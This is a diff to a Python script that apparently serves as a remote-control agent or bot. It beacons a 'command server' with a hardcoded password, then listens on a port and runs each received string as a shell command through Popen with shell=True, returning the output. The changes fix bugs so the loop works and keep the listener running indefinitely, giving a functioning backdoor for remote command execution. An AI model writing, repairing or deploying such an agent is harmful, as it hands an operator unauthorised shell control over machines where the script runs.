@@ -1,4 +1,5 @@
 import socket
+import shlex
 from subprocess import Popen, PIPE
 
 """
@@ -29,8 +30,8 @@ def get_ip():
 
 ###############################################################Main
 def main(*args):
-    controllerIP = ''
-    password = ''
+    controllerIP = '127.0.0.1'
+    password = '$$thisPa$_3w0rdSl@ps'
 
     if password == '':
         if len(args) > 1:
@@ -46,15 +47,15 @@ def main(*args):
 
     ####### init
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #send greeting to command server
-        s.connect((controllerIP, 4454))
+        s.connect((controllerIP, 22704))
         beacon = 'CONNECT: ' + password  #the security here leaves a lot to be desired but AES is annoying
 
         print('Attempting to beacon command server')
-        s.sendall(bytes(beacon))
+        s.sendall(bytes(beacon, 'utf-8'))
         data = s.recv(1024)
-        if repr(data) == b'ACCEPTED':
-            print('Login acknowledged by command server, awaiting instructions----------------------------------------')
-        elif repr(data) == b'BAD CRED':
+        if data == b'ACCEPTED':
+            print('Login acknowledged by command server, awaiting instructions...')
+        elif data == b'BAD CRED':
             print('Password rejected by command server, please try again')
             exit(10)
         else:
@@ -62,19 +63,28 @@ def main(*args):
             exit(20)
 
     ####### main loop
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #await instructions from server
-        s.bind((controllerIP, 4455))
-        s.listen()
-        conn, addr = s.accept()
-        with conn:
-            print('Command connection from', addr)
-            while True:
-                data = conn.recv(1024)
-                if not data:
-                    break
-                process = Popen(repr(data), shell=True, stdout=PIPE, stderr=PIPE)
-                stdout, stderr = process.communicate()
-                conn.sendall(bytes(stdout))
+    while True:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #await instructions from server
+            s.bind((controllerIP, 22705))
+            s.listen()
+            conn, addr = s.accept()
+            with conn:
+                print('Command connection from', addr)
+                while True:
+                    data = conn.recv(1024)
+                    if not data:
+                        break
+                    print('Command received ' + data.decode("utf-8"))
+                    command = shlex.split(data.decode("utf-8"))
+                    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
+                    stdout, stderr = process.communicate()
+                    print('sending back """\n' + stdout.decode("utf-8"), stderr.decode("utf-8"), '"""\n\n')
+                    if stderr != b'':
+                        conn.sendall(stderr)
+                    elif stdout != b'':
+                        conn.sendall(stdout)
+                    else:
+                        conn.sendall(b'The command completed successfully with no output')
 
     ####### clean up
 
